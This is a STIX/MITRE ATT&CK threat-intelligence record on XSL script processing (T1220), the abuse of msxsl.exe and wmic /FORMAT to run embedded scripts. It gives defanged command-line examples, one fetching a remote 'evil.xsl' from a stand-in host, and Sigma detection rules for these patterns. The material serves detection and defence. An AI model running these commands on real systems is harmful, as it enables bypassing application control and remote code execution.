{
    "type": "malware-behavior",
    "spec_version": "2.1",
    "id": "malware-behavior--1391d1d0-8a18-43c8-ab03-4db36784beb4",
    "created": "2024-08-13T14:46:36.968413Z",
    "modified": "2024-08-13T14:46:45.173591Z",
    "name": "XSL Script Processing",
    "description": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. [1]Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe) [2] can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. [3] Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. [4] Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.[5]Command-line examples:[3][5]msxsl.exe customers[.]xml script[.]xslmsxsl.exe script[.]xsl script[.]xslmsxsl.exe script[.]jpeg script[.]jpegAnother variation of this technique, dubbed 'Squiblytwo', involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file.[6] This technique can also execute local/remote scripts and, similar to its Regsvr32/ 'Squiblydoo' counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the /FORMAT switch.[5]Command-line examples:[5][6]Local File: wmic process list /FORMAT:evil[.]xslRemote File: wmic os get /FORMAT:'https[:]//example[.]com/evil[.]xsl'",
    "object_marking_refs": [
        "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
    ],
    "external_references": [
        {
            "source_name": "MITRE ATT&CK",
            "url": "https://attack.mitre.org/techniques/T1220",
            "external_id": "T1220"
        },
        {
            "source_name": "mitre-attack",
            "external_id": "T1220",
            "url": "https://attack.mitre.org/techniques/T1220"
        },
        {
            "source_name": "Reaqta MSXSL Spearphishing MAR 2018",
            "url": "https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/",
            "description": "Admin. (2018, March 2). Spear-phishing campaign leveraging on MSXSL. Retrieved July 3, 2018."
        },
        {
            "source_name": "Twitter SquiblyTwo Detection APR 2018",
            "url": "https://twitter.com/dez_/status/986614411711442944",
            "description": "Desimone, J. (2018, April 18). Status Update. Retrieved July 3, 2018."
        },
        {
            "source_name": "LOLBAS Wmic",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Wmic/",
            "description": "LOLBAS. (n.d.). Wmic.exe. Retrieved July 31, 2019."
        },
        {
            "source_name": "Microsoft msxsl.exe",
            "url": "https://www.microsoft.com/download/details.aspx?id=21714",
            "description": "Microsoft. (n.d.). Command Line Transformation Utility (msxsl.exe). Retrieved July 3, 2018."
        },
        {
            "source_name": "Penetration Testing Lab MSXSL July 2017",
            "url": "https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/",
            "description": "netbiosX. (2017, July 6). AppLocker Bypass \u2013 MSXSL. Retrieved July 3, 2018."
        },
        {
            "source_name": "XSL Bypass Mar 2019",
            "url": "https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75",
            "description": "Singh, A. (2019, March 14). MSXSL.EXE and WMIC.EXE \u2014 A Way to Proxy Code Execution. Retrieved August 2, 2019."
        },
        {
            "source_name": "Microsoft XSLT Script Mar 2017",
            "url": "https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script",
            "description": "Wenzel, M. et al. (2017, March 30). XSLT Stylesheet Scripting Using <msxsl:script>. Retrieved July 3, 2018."
        }
    ],
    "x_mitre_detection_rules": [
        {
            "author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)",
            "date": "2020/10/17",
            "description": "Detects threat actors proxy executing code and bypassing application controls by leveraging wmic and the `/FORMAT` argument switch to download and execute an XSL file (i.e js, vbs, etc).",
            "detection": {
                "condition": "selection",
                "selection": {
                    "ImageLoaded|endswith": [
                        "\\jscript.dll",
                        "\\vbscript.dll"
                    ],
                    "Image|endswith": "\\wmic.exe"
                }
            },
            "falsepositives": [
                "The command wmic os get lastboottuptime loads vbscript.dll",
                "The command wmic os get locale loads vbscript.dll",
                "Since the ImageLoad event doesn't have enough information in this case. It's better to look at the recent process creation events that spawned the WMIC process and investigate the command line and parent/child processes to get more insights"
            ],
            "id": "06ce37c2-61ab-4f05-9ff5-b1a96d18ae32",
            "level": "medium",
            "logsource": {
                "category": "image_load",
                "product": "windows"
            },
            "modified": "2022/10/13",
            "references": [
                "https://securitydatasets.com/notebooks/atomic/windows/defense_evasion/SDWIN-201017061100.html",
                "https://twitter.com/dez_/status/986614411711442944",
                "https://lolbas-project.github.io/lolbas/Binaries/Wmic/"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1220"
            ],
            "title": "WMIC Loading Scripting Libraries"
        },
        {
            "author": "Swachchhanda Shrawan Poudel",
            "date": "2023/11/09",
            "description": "Detects the execution of the \"msxsl\" binary with an \"http\" keyword in the command line. This might indicate a potential remote execution of XSL files.",
            "detection": {
                "condition": "selection",
                "selection": {
                    "CommandLine|contains": "http",
                    "Image|endswith": "\\msxsl.exe"
                }
            },
            "falsepositives": [
                "Msxsl is not installed by default and is deprecated, so unlikely on most systems."
            ],
            "id": "75d0a94e-6252-448d-a7be-d953dff527bb",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "references": [
                "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md",
                "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/"
            ],
            "status": "experimental",
            "title": "Remote XSL Execution Via Msxsl.EXE",
            "tags": [
                "attack.defense_evasion",
                "attack.t1220"
            ]
        },
        {
            "author": "Markus Neis, Florian Roth",
            "date": "2019/01/16",
            "description": "Detects potential SquiblyTwo attack technique with possible renamed WMIC via Imphash and OriginalFileName fields",
            "detection": {
                "condition": "all of selection_*",
                "selection_cli": {
                    "CommandLine|contains|all": [
                        "format:",
                        "http"
                    ]
                },
                "selection_pe": [
                    {
                        "Image|endswith": "\\wmic.exe"
                    },
                    {
                        "OriginalFileName": "wmic.exe"
                    },
                    {
                        "Imphash": [
                            "1B1A3F43BF37B5BFE60751F2EE2F326E",
                            "37777A96245A3C74EB217308F3546F4C",
                            "9D87C9D67CE724033C0B40CC4CA1B206"
                        ]
                    },
                    {
                        "Hashes|contains": [
                            "IMPHASH=1B1A3F43BF37B5BFE60751F2EE2F326E",
                            "IMPHASH=37777A96245A3C74EB217308F3546F4C",
                            "IMPHASH=9D87C9D67CE724033C0B40CC4CA1B206"
                        ]
                    }
                ]
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "8d63dadf-b91b-4187-87b6-34a1114577ea",
            "level": "medium",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2023/02/15",
            "references": [
                "https://web.archive.org/web/20190209154607/https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html",
                "https://twitter.com/mattifestation/status/986280382042595328",
                "https://atomicredteam.io/defense-evasion/T1220/",
                "https://lolbas-project.github.io/lolbas/Binaries/Wmic/"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1047",
                "attack.t1220",
                "attack.execution",
                "attack.t1059.005",
                "attack.t1059.007"
            ],
            "title": "Potential SquiblyTwo Technique Execution"
        },
        {
            "author": "Timur Zinniatullin, oscd.community",
            "date": "2019/10/21",
            "description": "Detects the execution of the MSXSL utility. This can be used to execute Extensible Stylesheet Language (XSL) files. These files are commonly used to describe the processing and rendering of data within XML files.\nAdversaries can abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\n",
            "detection": {
                "condition": "selection",
                "selection": {
                    "Image|endswith": "\\msxsl.exe"
                }
            },
            "falsepositives": [
                "Msxsl is not installed by default and is deprecated, so unlikely on most systems."
            ],
            "id": "9e50a8b3-dd05-4eb8-9153-bdb6b79d50b0",
            "level": "medium",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "references": [
                "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md",
                "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/"
            ],
            "modified": "2023/11/09",
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1220"
            ],
            "title": "Msxsl.EXE Execution"
        },
        {
            "author": "Timur Zinniatullin, oscd.community, Swachchhanda Shrawan Poudel",
            "date": "2019/10/21",
            "description": "Detects the execution of WMIC with the \"format\" flag to potentially load XSL files.\nAdversaries abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\nExtensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files.\n",
            "detection": {
                "condition": "selection and not 1 of filter_main_*",
                "filter_main_known_format": {
                    "CommandLine|contains": [
                        "Format:List",
                        "Format:htable",
                        "Format:hform",
                        "Format:table",
                        "Format:mof",
                        "Format:value",
                        "Format:rawxml",
                        "Format:xml",
                        "Format:csv"
                    ]
                },
                "selection": {
                    "CommandLine|contains|windash": "-format",
                    "Image|endswith": "\\wmic.exe"
                }
            },
            "falsepositives": [
                "WMIC.exe FP depend on scripts and administrative methods used in the monitored environment.",
                "Static format arguments - https://petri.com/command-line-wmi-part-3"
            ],
            "id": "05c36dd6-79d6-4a9a-97da-3db20298ab2d",
            "level": "medium",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2024/03/05",
            "references": [
                "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1220"
            ],
            "title": "XSL Script Execution Via WMIC.EXE"
        }
    ],
    "x_mitre_platforms": [
        "Windows"
    ],
    "x_mitre_domains": [
        "enterprise-attack"
    ],
    "x_mitre_contributors": [
        "Avneet Singh",
        "Casey Smith",
        "Praetorian"
    ],
    "kill_chain_phases": [
        {
            "phase_name": "defense-evasion",
            "kill_chain_name": "mitre-attack"
        }
    ],
    "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.\n\nThe presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.",
    "x_mitre_is_subtechnique": false,
    "x_mitre_version": "1.2",
    "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
    "x_mitre_data_sources": [
        "Module: Module Load",
        "Process: Process Creation"
    ],
    "x_mitre_permissions_required": []
}